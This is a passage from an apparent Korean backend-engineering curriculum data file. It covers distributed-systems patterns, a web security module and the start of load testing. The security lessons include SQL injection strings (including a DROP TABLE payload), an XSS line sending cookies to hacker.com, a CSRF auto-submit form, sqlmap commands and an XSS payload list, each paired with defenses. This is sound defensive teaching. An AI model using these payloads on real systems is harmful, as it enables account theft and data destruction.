      throw new Error('다른 사용자가 먼저 처리했습니다. 다시 시도해주세요.');
    }

    this.apply(event);
  }
}

// 사용
const account = await BankAccount.load('acc-123');
await account.withdraw(100);`},{heading:"4. CQRS (Command Query Responsibility Segregation)",content:"읽기와 쓰기를 분리하여 성능과 확장성 향상:",code:`// Write Model (명령 처리)
class OrderCommandHandler {
  async createOrder(command) {
    // 1. 이벤트 생성
    const event = {
      type: 'OrderCreated',
      orderId: uuid(),
      userId: command.userId,
      items: command.items,
      timestamp: new Date()
    };

    // 2. 이벤트 스토어에 저장
    await eventStore.append('orders', event);

    // 3. 이벤트 발행 (Message Queue)
    await eventBus.publish('order.created', event);
  }
}

// Read Model (조회 최적화)
// 이벤트를 구독하여 읽기 전용 DB 업데이트
eventBus.subscribe('order.created', async (event) => {
  // MongoDB에 비정규화된 데이터 저장
  await readDB.collection('orders').insertOne({
    orderId: event.orderId,
    userId: event.userId,
    items: event.items,
    userName: await getUserName(event.userId), // Join 미리 수행
    totalAmount: calculateTotal(event.items),
    createdAt: event.timestamp
  });

  // Elasticsearch에 검색용 인덱스 생성
  await searchIndex.index({
    index: 'orders',
    id: event.orderId,
    body: {
      orderId: event.orderId,
      items: event.items.map(i => i.name).join(' '),
      createdAt: event.timestamp
    }
  });
});

// 조회 API (읽기 전용 DB 사용)
app.get('/api/orders/:userId', async (req, res) => {
  const orders = await readDB.collection('orders').find({
    userId: req.params.userId
  }).toArray();

  res.json(orders); // 빠른 조회, JOIN 불필요
});`},{heading:"5. CRDTs (Conflict-free Replicated Data Types)",content:"분산 시스템에서 자동으로 충돌 해결하는 자료구조:",code:`// 예시: 협업 문서 편집 (Google Docs 같은)
// G-Counter (증가만 가능한 카운터)
class GCounter {
  constructor(nodeId) {
    this.nodeId = nodeId;
    this.counts = {}; // { node1: 5, node2: 3 }
  }

  increment() {
    this.counts[this.nodeId] = (this.counts[this.nodeId] || 0) + 1;
  }

  value() {
    return Object.values(this.counts).reduce((a, b) => a + b, 0);
  }

  merge(other) {
    for (const [node, count] of Object.entries(other.counts)) {
      this.counts[node] = Math.max(
        this.counts[node] || 0,
        count
      );
    }
  }
}

// 사용 (좋아요 카운터)
const counter1 = new GCounter('server1');
const counter2 = new GCounter('server2');

counter1.increment(); // server1에서 +1
counter2.increment(); // server2에서 +1
counter2.increment(); // server2에서 +1

console.log(counter1.value()); // 1
console.log(counter2.value()); // 2

// 동기화 (네트워크 복구 후)
counter1.merge(counter2);
console.log(counter1.value()); // 3 (자동 병합!)

// LWW-Element-Set (Last-Write-Wins Set)
// 실시간 협업 태그 편집에 사용
class LWWSet {
  constructor() {
    this.adds = {}; // { 'tag1': timestamp }
    this.removes = {}; // { 'tag1': timestamp }
  }

  add(element) {
    this.adds[element] = Date.now();
  }

  remove(element) {
    this.removes[element] = Date.now();
  }

  has(element) {
    const addTime = this.adds[element] || 0;
    const removeTime = this.removes[element] || 0;
    return addTime > removeTime; // 더 최근 타임스탬프 우선
  }

  merge(other) {
    for (const [elem, time] of Object.entries(other.adds)) {
      this.adds[elem] = Math.max(this.adds[elem] || 0, time);
    }
    for (const [elem, time] of Object.entries(other.removes)) {
      this.removes[elem] = Math.max(this.removes[elem] || 0, time);
    }
  }
}`},{heading:"6. 실전: 분산 속도 제한 (Rate Limiting)",code:`// Redis를 이용한 분산 Rate Limiter
const rateLimit = require('express-rate-limit');
const RedisStore = require('rate-limit-redis');

const limiter = rateLimit({
  store: new RedisStore({
    client: redis,
    prefix: 'rl:'
  }),
  windowMs: 60 * 1000, // 1분
  max: 100, // 100 요청
  message: '너무 많은 요청입니다. 1분 후 다시 시도해주세요.',
  standardHeaders: true,
  legacyHeaders: false
});

app.use('/api/', limiter);

// Sliding Window Log 알고리즘 (더 정확한 제한)
async function checkRateLimit(userId, limit = 100, window = 60) {
  const key = \`rate:\${userId}\`;
  const now = Date.now();
  const windowStart = now - (window * 1000);

  // 1. 오래된 기록 삭제
  await redis.zremrangebyscore(key, 0, windowStart);

  // 2. 현재 윈도우 내 요청 수 확인
  const count = await redis.zcard(key);

  if (count >= limit) {
    return false; // 제한 초과
  }

  // 3. 현재 요청 기록
  await redis.zadd(key, now, \`\${now}:\${Math.random()}\`);
  await redis.expire(key, window);

  return true; // 허용
}

app.post('/api/action', async (req, res) => {
  const allowed = await checkRateLimit(req.user.id, 10, 60);

  if (!allowed) {
    return res.status(429).json({
      error: '1분에 10번까지만 가능합니다.'
    });
  }

  // 비즈니스 로직
});`},{heading:"⚡ 고급 실습 과제",checklist:["Redlock으로 다중 Redis 분산 잠금 구현 후 한 Redis 다운시켜도 정상 동작 확인","이벤트 소싱 패턴으로 은행 계좌 시스템 구현 (입금/출금 이벤트)","CQRS 패턴으로 주문 시스템 구현 (쓰기용 MySQL, 읽기용 MongoDB)","G-Counter로 분산 좋아요 카운터 구현 후 여러 서버 동기화","Sliding Window Log 알고리즘으로 API Rate Limiter 구현 (분당 100회)"]}]}}},{id:"3-3",name:"보안 기초",goal:"기본적인 보안 위협을 이해하고 대응할 수 있다",hours:12,keywords:["web security","SQL injection","authentication"],tasks:["SQL Injection 공격 시뮬레이션","현재 사용 중인 인증 방식 파악","SSL 인증서 만료일 확인"],content:{beginner:{title:"초급: 주요 웹 보안 위협 이해하고 기본 방어하기",sections:[{heading:"📚 학습 목표",content:"OWASP Top 10 중 핵심 공격을 이해하고, 기본적인 방어 코드를 작성할 수 있다."},{heading:"1. SQL Injection (가장 위험한 공격)",content:"악의적인 SQL 코드를 주입하여 데이터베이스를 조작하는 공격입니다.",code:`// 취약한 코드 (절대 이렇게 하지 마세요!)
app.post('/login', (req, res) => {
  const query = \`
    SELECT * FROM users
    WHERE username = '\${req.body.username}'
    AND password = '\${req.body.password}'
  \`;

  db.query(query, (err, users) => {
    if (users.length > 0) {
      res.json({ success: true });
    }
  });
});

// 공격 시나리오:
// username: admin' --
// password: (아무거나)

// 실제 실행되는 쿼리:
// SELECT * FROM users WHERE username = 'admin' --' AND password = '...'
// '--'는 주석이므로 비밀번호 검증이 무시됨!

// 더 위험한 공격:
// username: admin'; DROP TABLE users; --
// 실행: SELECT * FROM users WHERE username = 'admin'; DROP TABLE users; --'
// 결과: users 테이블 삭제!`},{heading:"2. SQL Injection 방어 - Prepared Statement 사용",code:`// 안전한 코드 (Parameterized Query)
app.post('/login', async (req, res) => {
  const query = 'SELECT * FROM users WHERE username = ? AND password = ?';

  const [users] = await db.query(query, [
    req.body.username,
    req.body.password
  ]);

  if (users.length > 0) {
    res.json({ success: true });
  } else {
    res.status(401).json({ error: '로그인 실패' });
  }
});

// 작동 원리:
// 1. ?는 플레이스홀더
// 2. 두 번째 인자의 값이 자동으로 이스케이프됨
// 3. username에 "admin' --"를 넣어도 문자열로 처리
// 4. SELECT * FROM users WHERE username = 'admin\\' --' ... (안전!)

// ORM 사용 시 (더 안전)
const user = await User.findOne({
  where: {
    username: req.body.username,
    password: req.body.password
  }
});`},{heading:"3. XSS (Cross-Site Scripting) 공격",content:"악의적인 JavaScript를 삽입하여 다른 사용자의 브라우저에서 실행시키는 공격입니다.",code:`// 취약한 코드
app.get('/profile/:userId', async (req, res) => {
  const user = await db.query('SELECT * FROM users WHERE id = ?', [req.params.userId]);

  res.send(\`
    <h1>프로필</h1>
    <p>이름: \${user.name}</p>
    <p>소개: \${user.bio}</p>
  \`);
});

// 공격 시나리오:
// 사용자가 bio에 입력:
// <script>fetch('https://hacker.com/steal?cookie='+document.cookie)<\/script>

// 다른 사용자가 프로필 방문 시:
// 1. 스크립트가 실행됨
// 2. 세션 쿠키가 해커 서버로 전송됨
// 3. 해커가 쿠키로 로그인 가능 (계정 탈취!)`},{heading:"4. XSS 방어 - HTML 이스케이핑",code:`// 안전한 코드 (HTML Escaping)
const escapeHtml = (text) => {
  return text
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
};

app.get('/profile/:userId', async (req, res) => {
  const user = await db.query('SELECT * FROM users WHERE id = ?', [req.params.userId]);

  res.send(\`
    <h1>프로필</h1>
    <p>이름: \${escapeHtml(user.name)}</p>
    <p>소개: \${escapeHtml(user.bio)}</p>
  \`);
});

// 결과:
// <script>alert(1)<\/script>
// → &lt;script&gt;alert(1)&lt;/script&gt; (화면에 그대로 표시)

// React는 자동으로 이스케이프:
function Profile({ user }) {
  return (
    <div>
      <h1>프로필</h1>
      <p>이름: {user.name}</p>
      <p>소개: {user.bio}</p>
    </div>
  );
}
// React는 {}안의 값을 자동으로 이스케이프 (안전!)`},{heading:"5. HTTPS와 SSL/TLS 인증서",steps:[{label:"인증서 만료일 확인",code:`# 방법 1: OpenSSL 명령어
openssl s_client -connect yourdomain.com:443 -servername yourdomain.com 2>/dev/null | openssl x509 -noout -dates

# 출력:
# notBefore=Jan  1 00:00:00 2024 GMT
# notAfter=Apr  1 23:59:59 2024 GMT  ← 만료일!

# 방법 2: 브라우저
# 1. 사이트 접속
# 2. 주소창 자물쇠 아이콘 클릭
# 3. "인증서" 클릭
# 4. "유효 기간" 확인`},{label:"Let's Encrypt로 무료 인증서 발급",code:`# Certbot 설치 (Ubuntu)
sudo apt install certbot python3-certbot-nginx

# 인증서 발급 및 Nginx 자동 설정
sudo certbot --nginx -d yourdomain.com -d www.yourdomain.com

# 자동 갱신 설정 (90일마다 필요)
sudo certbot renew --dry-run

# Cron으로 자동화
sudo crontab -e
# 매일 새벽 3시에 갱신 체크
0 3 * * * certbot renew --quiet`}]},{heading:"6. 안전한 비밀번호 저장 (해싱)",code:`// 절대 안 됨: 평문 저장
await db.query('INSERT INTO users (username, password) VALUES (?, ?)', [
  username,
  password // 그대로 저장 ← 위험!
]);

// 안전: bcrypt로 해싱
const bcrypt = require('bcrypt');

// 회원가입
app.post('/signup', async (req, res) => {
  const saltRounds = 10;
  const hashedPassword = await bcrypt.hash(req.body.password, saltRounds);

  await db.query('INSERT INTO users (username, password) VALUES (?, ?)', [
    req.body.username,
    hashedPassword // 해시된 값 저장
  ]);

  res.json({ success: true });
});

// 로그인
app.post('/login', async (req, res) => {
  const [users] = await db.query('SELECT * FROM users WHERE username = ?', [
    req.body.username
  ]);

  if (users.length === 0) {
    return res.status(401).json({ error: '사용자 없음' });
  }

  const match = await bcrypt.compare(req.body.password, users[0].password);

  if (match) {
    res.json({ success: true });
  } else {
    res.status(401).json({ error: '비밀번호 틀림' });
  }
});

// DB에 저장되는 예시:
// username: admin
// password: $2b$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy
// → 원본 비밀번호 복구 불가능!`},{heading:"💡 초급 실습 과제",checklist:["취약한 로그인 코드에 SQL Injection 공격 시도 후 성공 확인","Prepared Statement로 수정 후 공격 방어 확인","사용자 입력을 그대로 출력하여 XSS 공격 재현","HTML 이스케이핑 적용 후 스크립트 실행 안 되는지 확인","현재 운영 중인 사이트의 SSL 인증서 만료일 확인"]}]},intermediate:{title:"중급: 인증/인가 시스템과 CSRF 방어",sections:[{heading:"📚 학습 목표",content:"JWT 인증을 구현하고, CSRF와 같은 세션 관련 공격을 방어할 수 있다."},{heading:"1. JWT (JSON Web Token) 인증 구현",code:`const jwt = require('jsonwebtoken');
const SECRET_KEY = process.env.JWT_SECRET; // 환경변수로 관리

// 로그인 (토큰 발급)
app.post('/login', async (req, res) => {
  const [users] = await db.query('SELECT * FROM users WHERE username = ?', [
    req.body.username
  ]);

  if (users.length === 0) {
    return res.status(401).json({ error: '인증 실패' });
  }

  const match = await bcrypt.compare(req.body.password, users[0].password);

  if (!match) {
    return res.status(401).json({ error: '인증 실패' });
  }

  // JWT 토큰 생성
  const token = jwt.sign(
    {
      userId: users[0].id,
      username: users[0].username,
      role: users[0].role
    },
    SECRET_KEY,
    { expiresIn: '1h' } // 1시간 후 만료
  );

  res.json({ token });
});

// 인증 미들웨어
function authenticateToken(req, res, next) {
  const authHeader = req.headers['authorization'];
  const token = authHeader && authHeader.split(' ')[1]; // Bearer TOKEN

  if (!token) {
    return res.status(401).json({ error: '토큰 없음' });
  }

  jwt.verify(token, SECRET_KEY, (err, user) => {
    if (err) {
      return res.status(403).json({ error: '유효하지 않은 토큰' });
    }

    req.user = user; // 토큰에서 추출한 정보
    next();
  });
}

// 보호된 라우트
app.get('/api/profile', authenticateToken, async (req, res) => {
  const [users] = await db.query('SELECT * FROM users WHERE id = ?', [
    req.user.userId
  ]);

  res.json(users[0]);
});

// Frontend에서 사용
fetch('/api/profile', {
  headers: {
    'Authorization': \`Bearer \${token}\`
  }
})`},{heading:"2. Refresh Token으로 보안 강화",code:`// Access Token (짧은 만료 시간) + Refresh Token (긴 만료 시간)
app.post('/login', async (req, res) => {
  // ... 인증 로직

  const accessToken = jwt.sign(
    { userId: user.id },
    ACCESS_TOKEN_SECRET,
    { expiresIn: '15m' } // 15분
  );

  const refreshToken = jwt.sign(
    { userId: user.id },
    REFRESH_TOKEN_SECRET,
    { expiresIn: '7d' } // 7일
  );

  // Refresh Token을 DB에 저장
  await db.query('UPDATE users SET refresh_token = ? WHERE id = ?', [
    refreshToken,
    user.id
  ]);

  res.json({ accessToken, refreshToken });
});

// Access Token 갱신 엔드포인트
app.post('/refresh', async (req, res) => {
  const { refreshToken } = req.body;

  if (!refreshToken) {
    return res.status(401).json({ error: '리프레시 토큰 없음' });
  }

  // DB에 저장된 토큰과 일치하는지 확인
  const [users] = await db.query('SELECT * FROM users WHERE refresh_token = ?', [
    refreshToken
  ]);

  if (users.length === 0) {
    return res.status(403).json({ error: '유효하지 않은 토큰' });
  }

  jwt.verify(refreshToken, REFRESH_TOKEN_SECRET, (err, user) => {
    if (err) {
      return res.status(403).json({ error: '만료된 토큰' });
    }

    const newAccessToken = jwt.sign(
      { userId: user.userId },
      ACCESS_TOKEN_SECRET,
      { expiresIn: '15m' }
    );

    res.json({ accessToken: newAccessToken });
  });
});

// 로그아웃 (토큰 무효화)
app.post('/logout', authenticateToken, async (req, res) => {
  await db.query('UPDATE users SET refresh_token = NULL WHERE id = ?', [
    req.user.userId
  ]);

  res.json({ success: true });
});`},{heading:"3. CSRF (Cross-Site Request Forgery) 공격과 방어",content:"사용자가 로그인한 상태에서 악의적인 요청을 자동으로 보내는 공격입니다.",code:`// 공격 시나리오:
// 1. 사용자가 example.com에 로그인 (쿠키 저장됨)
// 2. 악의적인 사이트 evil.com 방문
// 3. evil.com에 숨겨진 코드:
<form action="https://example.com/transfer" method="POST">
  <input type="hidden" name="to" value="hacker">
  <input type="hidden" name="amount" value="10000">
</form>
<script>document.forms[0].submit();<\/script>

// 결과:
// - 사용자 모르게 10000원이 해커에게 송금됨
// - 브라우저가 자동으로 쿠키를 포함하여 요청을 보냄

// 방어 1: CSRF 토큰 사용
const csurf = require('csurf');
const csrfProtection = csurf({ cookie: true });

app.get('/form', csrfProtection, (req, res) => {
  res.render('form', { csrfToken: req.csrfToken() });
});

app.post('/transfer', csrfProtection, (req, res) => {
  // CSRF 토큰이 유효하지 않으면 자동으로 403 에러
  // 유효한 경우에만 여기 도달
  res.json({ success: true });
});

// HTML:
<form action="/transfer" method="POST">
  <input type="hidden" name="_csrf" value="<%= csrfToken %>">
  <input name="to">
  <input name="amount">
  <button type="submit">송금</button>
</form>

// 방어 2: SameSite 쿠키 속성
res.cookie('sessionId', sessionId, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict' // 다른 사이트에서의 요청에는 쿠키 안 보냄
});`},{heading:"4. 권한 관리 (Authorization)",code:`// Role-Based Access Control (RBAC)
const roles = {
  admin: ['read', 'write', 'delete', 'manage_users'],
  editor: ['read', 'write'],
  viewer: ['read']
};

function authorize(requiredPermission) {
  return (req, res, next) => {
    const userRole = req.user.role; // JWT에서 추출
    const permissions = roles[userRole];

    if (!permissions || !permissions.includes(requiredPermission)) {
      return res.status(403).json({
        error: '권한이 없습니다.'
      });
    }

    next();
  };
}

// 사용
app.delete('/api/posts/:id',
  authenticateToken,
  authorize('delete'), // delete 권한 필요
  async (req, res) => {
    await db.query('DELETE FROM posts WHERE id = ?', [req.params.id]);
    res.json({ success: true });
  }
);

// 더 세밀한 제어: 본인 것만 수정 가능
app.put('/api/posts/:id',
  authenticateToken,
  async (req, res) => {
    const [posts] = await db.query('SELECT * FROM posts WHERE id = ?', [
      req.params.id
    ]);

    if (posts.length === 0) {
      return res.status(404).json({ error: '게시글 없음' });
    }

    // 본인 글이거나 관리자인 경우에만 허용
    if (posts[0].author_id !== req.user.userId && req.user.role !== 'admin') {
      return res.status(403).json({ error: '권한 없음' });
    }

    await db.query('UPDATE posts SET content = ? WHERE id = ?', [
      req.body.content,
      req.params.id
    ]);

    res.json({ success: true });
  }
);`},{heading:"5. Rate Limiting으로 브루트포스 방어",code:`const rateLimit = require('express-rate-limit');

// 로그인 시도 제한
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15분
  max: 5, // 5번 시도
  message: '너무 많은 로그인 시도. 15분 후 다시 시도하세요.',
  skipSuccessfulRequests: true // 성공하면 카운트 안 함
});

app.post('/login', loginLimiter, async (req, res) => {
  // 로그인 로직
});

// IP별 제한 + 사용자별 제한
const RedisStore = require('rate-limit-redis');

const apiLimiter = rateLimit({
  store: new RedisStore({ client: redis }),
  windowMs: 60 * 1000,
  max: async (req) => {
    if (req.user && req.user.role === 'admin') {
      return 1000; // 관리자는 1000회
    }
    return 100; // 일반 사용자는 100회
  },
  keyGenerator: (req) => {
    // 로그인 사용자는 userId, 비로그인은 IP
    return req.user ? \`user:\${req.user.userId}\` : \`ip:\${req.ip}\`;
  }
});

app.use('/api/', apiLimiter);`},{heading:"⚡ 중급 실습 과제",checklist:["JWT 인증 시스템 구현 후 Postman으로 토큰 확인","만료된 토큰으로 요청 시 403 에러 발생하는지 테스트","CSRF 토큰 없이 요청 시 차단되는지 확인","일반 사용자로 관리자 전용 API 호출 시 403 확인","로그인 5번 실패 후 15분 제한되는지 확인"]}]},advanced:{title:"고급: 보안 모니터링과 침투 테스트",sections:[{heading:"📚 학습 목표",content:"보안 취약점을 자동으로 탐지하고, 침투 테스트로 시스템을 강화할 수 있다."},{heading:"1. OWASP ZAP로 자동 취약점 스캔",steps:[{label:"설치 및 기본 스캔",code:`# Docker로 OWASP ZAP 실행
docker run -t owasp/zap2docker-stable zap-baseline.py -t https://your-app.com

# 결과:
# WARN-NEW: SQL Injection (GET parameter 'id')
# WARN-NEW: Cross Site Scripting (Reflected) (POST parameter 'comment')
# WARN-NEW: Missing Anti-CSRF Tokens (POST /api/transfer)

# HTML 리포트 생성
docker run -v $(pwd):/zap/wrk/:rw -t owasp/zap2docker-stable \\
  zap-full-scan.py -t https://your-app.com -r report.html`},{label:"CI/CD 파이프라인 통합",code:`# .github/workflows/security-scan.yml
name: Security Scan
on:
  pull_request:
    branches: [main]

jobs:
  zap_scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      - name: Run ZAP Scan
        run: |
          docker run -v \${GITHUB_WORKSPACE}:/zap/wrk/:rw \\
            -t owasp/zap2docker-stable \\
            zap-baseline.py -t \${{ secrets.STAGING_URL }} \\
            -r zap-report.html

      - name: Upload Report
        uses: actions/upload-artifact@v3
        with:
          name: zap-report
          path: zap-report.html

      # 심각한 취약점 발견 시 PR 차단
      - name: Check Vulnerabilities
        run: |
          if grep -q "FAIL-NEW" zap-report.html; then
            echo "Critical vulnerabilities found!"
            exit 1
          fi`}]},{heading:"2. Content Security Policy (CSP) 설정",code:`// XSS 공격을 원천 차단하는 HTTP 헤더
const helmet = require('helmet');

app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: [
      "'self'",
      "'unsafe-inline'", // React의 인라인 스크립트 허용 (최소화 권장)
      "https://cdn.jsdelivr.net"
    ],
    styleSrc: ["'self'", "'unsafe-inline'"],
    imgSrc: ["'self'", "data:", "https:"],
    connectSrc: ["'self'", "https://api.example.com"],
    fontSrc: ["'self'", "https://fonts.gstatic.com"],
    objectSrc: ["'none'"],
    upgradeInsecureRequests: []
  }
}));

// 응답 헤더:
// Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.jsdelivr.net; ...

// 효과:
// 1. 허용되지 않은 도메인의 스크립트 실행 차단
// 2. 인라인 스크립트 차단 (XSS 방어)
// 3. eval() 같은 위험한 함수 차단

// 위반 리포트 수집
app.use(helmet.contentSecurityPolicy({
  directives: {
    // ... 위와 동일
    reportUri: '/api/csp-report'
  }
}));

app.post('/api/csp-report', express.json({ type: 'application/csp-report' }), (req, res) => {
  console.log('CSP Violation:', req.body);
  // Sentry 등으로 전송
  res.status(204).end();
});`},{heading:"3. 보안 로그 수집 및 분석",code:`// Winston으로 보안 이벤트 로깅
const winston = require('winston');

const securityLogger = winston.createLogger({
  level: 'info',
  format: winston.format.json(),
  transports: [
    new winston.transports.File({ filename: 'security.log' }),
    new winston.transports.Console()
  ]
});

// 의심스러운 활동 로깅
app.post('/login', async (req, res) => {
  const { username, password } = req.body;

  const [users] = await db.query('SELECT * FROM users WHERE username = ?', [username]);

  if (users.length === 0) {
    securityLogger.warn('Login attempt with non-existent user', {
      username,
      ip: req.ip,
      userAgent: req.headers['user-agent'],
      timestamp: new Date()
    });
    return res.status(401).json({ error: '인증 실패' });
  }

  const match = await bcrypt.compare(password, users[0].password);

  if (!match) {
    securityLogger.warn('Failed login attempt', {
      userId: users[0].id,
      username,
      ip: req.ip,
      timestamp: new Date()
    });

    // 5번 실패 시 계정 잠금
    await db.query(
      'UPDATE users SET failed_attempts = failed_attempts + 1 WHERE id = ?',
      [users[0].id]
    );

    const updatedUser = await db.query('SELECT * FROM users WHERE id = ?', [users[0].id]);
    if (updatedUser[0].failed_attempts >= 5) {
      securityLogger.error('Account locked due to multiple failed attempts', {
        userId: users[0].id,
        ip: req.ip
      });
      await db.query('UPDATE users SET locked_until = ? WHERE id = ?', [
        new Date(Date.now() + 30 * 60 * 1000), // 30분 잠금
        users[0].id
      ]);
    }

    return res.status(401).json({ error: '인증 실패' });
  }

  // 성공 시 실패 카운터 리셋
  await db.query('UPDATE users SET failed_attempts = 0 WHERE id = ?', [users[0].id]);

  securityLogger.info('Successful login', {
    userId: users[0].id,
    ip: req.ip
  });

  // JWT 발급...
});

// 권한 없는 접근 시도
app.use((err, req, res, next) => {
  if (err.status === 403) {
    securityLogger.warn('Unauthorized access attempt', {
      userId: req.user?.userId,
      path: req.path,
      method: req.method,
      ip: req.ip
    });
  }
  next(err);
});`},{heading:"4. 침투 테스트 (Penetration Testing)",code:`# sqlmap으로 SQL Injection 테스트
sqlmap -u "https://your-app.com/api/users?id=1" --batch --risk=3 --level=5

# 결과:
# [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause'
# [INFO] GET parameter 'id' is vulnerable. Do you want to keep testing? [y/N] y
# sqlmap identified the following injection point(s):
# Parameter: id (GET)
#   Type: boolean-based blind
#   Payload: id=1 AND 1=1

# Burp Suite로 XSS 테스트
# 1. Burp Suite 실행
# 2. 브라우저 프록시 설정
# 3. Intruder 탭에서 페이로드 설정:
<script>alert(1)<\/script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>alert(String.fromCharCode(88,83,83))<\/script>

# 4. Attack 실행 후 응답 확인

# Nikto 웹 서버 스캔
nikto -h https://your-app.com

# 결과:
# + Server: nginx/1.18.0
# + The anti-clickjacking X-Frame-Options header is not present.
# + The X-Content-Type-Options header is not set.
# + No CGI Directories found
# + OSVDB-3268: /backup/: Directory indexing found.

# 보안 헤더 추가
app.use(helmet({
  frameguard: { action: 'deny' }, // Clickjacking 방지
  contentTypeOptions: true, // MIME 타입 스니핑 방지
  hsts: {
    maxAge: 31536000,
    includeSubDomains: true,
    preload: true
  }
}));`},{heading:"5. Secrets 관리 및 환경변수 보안",code:`// .env 파일 사용 (절대 Git에 커밋하지 마세요!)
// .env
DATABASE_PASSWORD=super_secret_password
JWT_SECRET=very_long_random_string_here
API_KEY=sk-1234567890abcdef

// .gitignore에 추가
echo ".env" >> .gitignore

// 코드에서 사용
require('dotenv').config();

const dbPassword = process.env.DATABASE_PASSWORD;
const jwtSecret = process.env.JWT_SECRET;

// Docker Secrets 사용 (프로덕션)
# docker-compose.yml
version: '3.8'
services:
  app:
    image: myapp
    secrets:
      - db_password
      - jwt_secret

secrets:
  db_password:
    file: ./secrets/db_password.txt
  jwt_secret:
    file: ./secrets/jwt_secret.txt

// 코드에서 읽기
const fs = require('fs');

const dbPassword = fs.readFileSync('/run/secrets/db_password', 'utf8').trim();
const jwtSecret = fs.readFileSync('/run/secrets/jwt_secret', 'utf8').trim();

// AWS Secrets Manager 사용 (클라우드)
const AWS = require('aws-sdk');
const secretsManager = new AWS.SecretsManager({ region: 'us-east-1' });

async function getSecret(secretName) {
  const data = await secretsManager.getSecretValue({ SecretId: secretName }).promise();
  return JSON.parse(data.SecretString);
}

const secrets = await getSecret('prod/myapp/credentials');
const dbPassword = secrets.DATABASE_PASSWORD;`},{heading:"6. 보안 체크리스트 자동화",code:`# npm audit로 의존성 취약점 점검
npm audit

# 결과:
# found 3 vulnerabilities (1 moderate, 2 high) in 1200 scanned packages
#   run \`npm audit fix\` to fix them, or \`npm audit\` for details

# 자동 수정
npm audit fix

# 강제 수정 (breaking changes 포함)
npm audit fix --force

# GitHub Dependabot 활성화
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "weekly"
    open-pull-requests-limit: 10

# Snyk로 실시간 모니터링
snyk monitor
# https://app.snyk.io 에서 대시보드 확인

# Pre-commit hook으로 보안 검사
# .husky/pre-commit
#!/bin/sh
npm audit --audit-level=high
if [ $? -ne 0 ]; then
  echo "Security vulnerabilities found! Commit aborted."
  exit 1
fi`},{heading:"⚡ 고급 실습 과제",checklist:["OWASP ZAP으로 전체 앱 스캔 후 발견된 취약점 수정","CSP 헤더 설정 후 외부 스크립트 차단되는지 확인","sqlmap으로 SQL Injection 테스트 후 모든 파라미터 방어 확인","실패한 로그인 시도 5번 후 계정 30분 잠금 구현","GitHub Actions에 보안 스캔 추가하여 취약점 발견 시 PR 차단"]}]}}},{id:"3-4",name:"부하 테스트와 스케일링",goal:"시스템의 한계를 파악하고 확장 계획을 세울 수 있다",hours:10,keywords:["load testing","scalability","performance benchmarking"],tasks:["간단한 부하 테스트 (JMeter 또는 Artillery)","현재 시스템의 동시 접속 한계 측정","서버 증설 계획 작성"],content:{beginner:{title:"초급: 부하 테스트 도구로 시스템 한계 측정하기",sections:[{heading:"📚 학습 목표",content:"부하 테스트의 개념을 이해하고, 간단한 도구로 현재 시스템의 처리 능력을 측정할 수 있다."},{heading:"1. 부하 테스트가 필요한 이유",content:"실제 운영 환경에서 장애가 발생하기 전에 시스템의 한계를 파악해야 합니다.",list:["실제 상황: 평소 100명 → 이벤트 때 1만명 → 서버 다운","테스트로 미리 발견: 500명에서 응답 시간 5초 증가 → 대비 가능","용량 계획 수립: 몇 명까지 감당 가능한지 정확히 알 수 있음","병목 지점 파악: DB? 서버? 네트워크?"]},{heading:"2. Apache Bench로 첫 부하 테스트",steps:[{label:"설치 (대부분 OS에 기본 설치됨)",code:`# macOS/Linux 확인
which ab

# Ubuntu 설치
sudo apt install apache2-utils

# Windows
# https://www.apachelounge.com/download/ 에서 다운로드`},{label:"기본 사용법",code:`# 100개 요청, 동시 10개
ab -n 100 -c 10 https://your-app.com/

# 결과:
Concurrency Level:      10
Time taken for tests:   2.345 seconds
Complete requests:      100
Failed requests:        0
Total transferred:      45600 bytes
Requests per second:    42.64 [#/sec] ← 초당 처리량
Time per request:       234.5 [ms] ← 평균 응답 시간
Time per request:       23.5 [ms] (mean, across all concurrent requests)

# 해석:
- 초당 42개 요청 처리 가능
- 평균 응답 시간 234ms
- 실패 0개 → 안정적`},{label:"부하 증가시키기",code:`# 1000개 요청, 동시 100개
ab -n 1000 -c 100 https://your-app.com/api/products

# 결과:
Requests per second:    25.32 [#/sec] ← 감소!
Time per request:       3950.5 [ms] ← 증가!
Failed requests:        15 ← 실패 발생!

# 문제 발견:
- 동시 접속 100명에서 성능 저하
- 일부 요청 실패 (타임아웃)
- 처리량 42 → 25로 감소 (40% 하락)`}]},{heading:"3. k6로 시나리오 기반 테스트",code:`// k6 설치
// https://k6.io/docs/getting-started/installation/

// test.js
import http from 'k6/http';
import { sleep, check } from 'k6';

export const options = {
  stages: [
    { duration: '30s', target: 20 },  // 30초 동안 20명까지 증가
    { duration: '1m', target: 50 },   // 1분 동안 50명 유지
    { duration: '30s', target: 0 },   // 30초 동안 0명으로 감소
  ],
  thresholds: {
    http_req_duration: ['p(95)<500'], // 95%가 500ms 이내
    http_req_failed: ['rate<0.01'],   // 실패율 1% 이하
  },
};

export default function () {
  const res = http.get('https://your-app.com/api/products');

  check(res, {
    '상태 코드 200': (r) => r.status === 200,
    '응답 시간 < 500ms': (r) => r.timings.duration < 500,
  });

  sleep(1);
}

// 실행
k6 run test.js

// 결과:
     ✓ 상태 코드 200
     ✗ 응답 시간 < 500ms
       ↳  85% — ✓ 4250 / ✗ 750

     http_req_duration..........: avg=450ms min=120ms med=420ms max=2.1s p(95)=680ms ← 임계값 초과!
     http_req_failed............: 0.80% ✓ 40 ✗ 4960 ← 통과
     iterations.................: 5000`},{heading:"4. 동시 접속자 한계 찾기",code:`# 단계별로 부하 증가
# Step 1: 동시 10명
ab -n 100 -c 10 https://your-app.com/
# 결과: 평균 200ms, 실패 0

# Step 2: 동시 50명
ab -n 500 -c 50 https://your-app.com/
# 결과: 평균 400ms, 실패 0

# Step 3: 동시 100명
ab -n 1000 -c 100 https://your-app.com/
